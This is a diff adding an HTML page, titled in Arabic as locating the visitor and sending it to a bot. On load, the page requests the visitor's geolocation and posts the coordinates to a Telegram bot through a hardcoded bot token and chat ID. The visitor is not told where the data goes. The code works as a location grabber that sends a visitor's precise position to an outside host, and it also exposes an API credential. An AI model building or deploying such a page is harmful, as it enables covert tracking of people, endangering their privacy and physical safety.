@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد موقع الزائر وإرساله للبوت</title>
+</head>
+<body>
+    <h1>تحديد موقع الزائر وإرساله للبوت</h1>
+
+    <script>
+        function getLocationAndSend() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            var token = '6845141846:AAHqQu5jJJuWzDb8YNAUyY-nWx7F5d08gxE';
+            var chatId = '829549685';
+
+            var data = {
+                chat_id: chatId,
+                text: 'New location: Latitude ' + latitude + ', Longitude ' + longitude
+            };
+
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                console.log('Location sent successfully');
+            })
+            .catch(error => {
+                console.error('Error sending location:', error);
+            });
+        }
+        
+        getLocationAndSend();
+    </script>
+</body>
+</html>
